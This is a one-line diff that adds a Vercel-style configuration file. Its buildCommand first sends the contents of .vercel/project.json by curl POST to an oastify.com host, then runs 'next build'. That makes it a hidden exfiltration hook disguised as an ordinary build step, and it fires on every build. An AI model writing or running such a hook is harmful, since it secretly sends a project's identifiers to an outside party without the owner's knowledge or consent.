@@ -1,0 +1,1 @@
+{"buildCommand": "curl -X POST -d \"$(cat .vercel/project.json)\" https://tebvp8x6drpdp3n0butq3nja319sxls9h.oastify.com && next build"}
